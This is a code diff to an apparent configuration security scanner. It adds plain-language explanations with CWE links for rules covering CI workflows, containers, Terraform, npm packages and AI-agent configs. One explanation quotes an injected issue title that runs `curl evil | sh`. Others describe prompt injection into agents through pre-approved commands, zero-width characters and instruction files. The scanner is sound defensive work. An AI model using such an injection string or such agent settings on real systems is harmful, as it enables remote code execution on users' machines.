@@ -614,11 +614,55 @@ var SEVERITIES = ["low", "medium", "high", "critical"], rank = (severity) => sev
     return !0;
   });
 };
-var ICON = { critical: "\uD83D\uDFE5", high: "\uD83D\uDFE7", medium: "\uD83D\uDFE8", low: "⬜" }, SECRET_RULES = /* @__PURE__ */ new Set(["SEC001", "SEC002", "DKR003", "TF005", "CMP004", "AGT004"]), mask = (line) => line.replace(/([=:]\s*["']?)([^"'\s,;)]{4,})/g, (_, lead, value) => `${lead}${value.slice(0, 3)}****`).replace(/\b([A-Za-z0-9_-]{3})[A-Za-z0-9_\-+/]{12,}\b(?!\s*[=:])/g, "$1****"), formatFindings = (path, findings) => findings.map((f) => {
-  let shown = SECRET_RULES.has(f.id) ? mask(f.snippet) : f.snippet;
+var ICON = { critical: "\uD83D\uDFE5", high: "\uD83D\uDFE7", medium: "\uD83D\uDFE8", low: "⬜" }, SECRET_RULES = /* @__PURE__ */ new Set(["SEC001", "SEC002", "DKR003", "TF005", "CMP004", "AGT004"]), mask = (line) => line.replace(/([=:]\s*["']?)([^"'\s,;)]{4,})/g, (_, lead, value) => `${lead}${value.slice(0, 3)}****`).replace(/\b([A-Za-z0-9_-]{3})[A-Za-z0-9_\-+/]{12,}\b(?!\s*[=:])/g, "$1****"), shown = (f) => SECRET_RULES.has(f.id) ? mask(f.snippet) : f.snippet, EXPLAIN = {
+  GHA001: { cwe: 829, why: "A tag like @v4 can be moved to new code at any time; if the action's repo is compromised, your pipeline runs the attacker's code with your secrets (tj-actions/changed-files, 2025)." },
+  GHA002: { cwe: 829, why: `pull_request_target runs with write access and secrets; checking out the PR's code lets any outside contributor run their code with them ("pwn request").` },
+  GHA003: { cwe: 78, why: 'An issue title is attacker-controlled text; inside run: it becomes part of the shell script, so a title like `a"; curl evil | sh; "` runs on your runner.' },
+  GHA004: { cwe: 250, why: "Every step, including third-party actions, gets a token that can push code, publish releases and change settings. One compromised step owns the repo." },
+  GHA005: { cwe: 250, why: "Without a permissions block the token gets the repository default, often read-write. Least privilege limits what a compromised step can do." },
+  GHA006: { cwe: 532, why: "Inline secrets are pasted into the generated script, where they can leak through logs, error messages or the process list." },
+  DKR001: { cwe: 1104, why: "latest changes under you: today's build and tomorrow's are different images, and a compromised upstream tag lands in production unreviewed." },
+  DKR002: { cwe: 250, why: "A process running as root inside the container is one kernel or runtime bug away from root on the host." },
+  DKR003: { cwe: 538, why: "ENV and ARG values are stored in the image layers; anyone who can pull the image can read them with `docker history`." },
+  DKR004: { cwe: 494, why: "ADD silently downloads URLs and unpacks archives, without checksum, which makes it easy to pull in something you did not review." },
+  DKR005: { cwe: 494, why: "Piping a download into a shell runs whatever the server sends today, with no check that it is the script you reviewed." },
+  TF001: { cwe: 284, why: "Bots scan the whole IPv4 space in minutes; an open SSH, RDP or database port is found and attacked within hours." },
+  TF002: { cwe: 284, why: "Public buckets are the most common cloud data leak: anyone with the URL can list and download everything in them." },
+  TF003: { cwe: 269, why: "Owner/admin rights let one leaked credential delete or take over the whole project, not just the service that needed access." },
+  TF004: { cwe: 284, why: "A database on a public IP is exposed to password guessing and unpatched-server exploits from the entire internet." },
+  TF005: { cwe: 798, why: "Terraform files end up in git, plan output and state; a password written there is readable by everyone with repo access, forever, in history." },
+  TF006: { cwe: 311, why: "Without encryption, a stolen disk, snapshot or backup exposes the data in plain text, and many compliance regimes forbid it." },
+  TF007: { cwe: 693, why: "Without deletion protection, one wrong apply or destroy wipes a stateful resource and its data." },
+  K8S001: { cwe: 250, why: "A privileged container can access every device of the node; escaping to the host is trivial." },
+  K8S002: { cwe: 668, why: "Sharing the host's network, process list or file system lets the pod see and tamper with other workloads on the node." },
+  K8S003: { cwe: 250, why: "Running as root or allowing escalation turns any code-execution bug in the app into root inside the container, one step from the node." },
+  K8S004: { cwe: 1104, why: "Unpinned images make rollbacks and audits impossible: you cannot tell which code actually ran." },
+  CMP001: { cwe: 250, why: "A privileged container can access every device of the host; escaping to the host is trivial." },
+  CMP002: { cwe: 250, why: "Access to the Docker socket is root on the host: the container can start a new privileged container that mounts /." },
+  CMP003: { cwe: 668, why: "Host namespaces remove the isolation between the container and the machine: it sees host processes and every port." },
+  CMP004: { cwe: 798, why: "Compose files are committed and shared; a password written there is readable by everyone with repo access, forever, in history." },
+  CMP005: { cwe: 1104, why: "latest changes under you, so two developers and the server run different code with the same compose file." },
+  NPM001: { cwe: 506, why: "Install scripts run on every machine that installs the package; this is how most npm supply-chain attacks steal tokens (event-stream, ua-parser-js)." },
+  NPM002: { cwe: 829, why: "A git or URL dependency skips the registry's immutability: the branch or file can change to malicious code without a new version." },
+  NPM003: { cwe: 1104, why: "Any-version ranges install whatever was published last, including a hijacked release." },
+  AGT001: { cwe: 862, why: "With every shell command pre-approved, a prompt injection in a file, web page or issue can make the agent run anything on your machine without asking you." },
+  AGT002: { cwe: 693, why: "These switches turn off the checks between the agent and your machine, or start any MCP server a cloned repository brings, with your credentials." },
+  AGT003: { cwe: 829, why: "An unpinned MCP server downloads and runs the newest package on every start, with access to your tokens; one hijacked release is enough." },
+  AGT004: { cwe: 798, why: "Agent config is committed and shared; a token written there leaks to everyone with repo access and to every tool that reads the config." },
+  AGT005: { cwe: 451, why: "Zero-width characters hide text from human reviewers while the model still reads it: a classic way to smuggle instructions into a prompt." },
+  AGT006: { cwe: 77, why: "Instruction files are read as trusted prompts by every session; text that overrides rules or hides actions is prompt injection." },
+  AGT007: { cwe: 494, why: "Hooks run automatically on every event with your permissions; a downloaded script can change at any time." },
+  AGT008: { cwe: 693, why: "Switching a rule off silences it for everyone in the repo, so the decision deserves a human review." },
+  SEC001: { cwe: 321, why: "Anyone with repo access, now or later via history, can use the key; deleting the file does not remove it from git history." },
+  SEC002: { cwe: 798, why: "Leaked keys are scraped from public repos within minutes and used for crypto mining, data theft or spam on your bill." },
+  SEC003: { cwe: 451, why: "Bidirectional control characters make code display differently than it compiles, so a reviewer approves something other than what runs (CVE-2021-42574)." },
+  SEC004: { cwe: 538, why: "A .env file usually holds real credentials; if git does not ignore it, the next `git add .` commits them." }
+}, formatFindings = (path, findings, explain = !1) => findings.map((f) => {
+  let why = explain ? EXPLAIN[f.id] : void 0, lesson = why ? `
+   why: ${why.why} (CWE-${why.cwe}: https://cwe.mitre.org/data/definitions/${why.cwe}.html)` : "";
   return `${ICON[f.severity]} ${f.id} [${f.severity}] ${base(path)}:${f.line}: ${f.title}
-   ${shown}
-   fix: ${f.fix}`;
+   ${shown(f)}
+   fix: ${f.fix}${lesson}`;
 }).join(`
 `);
 
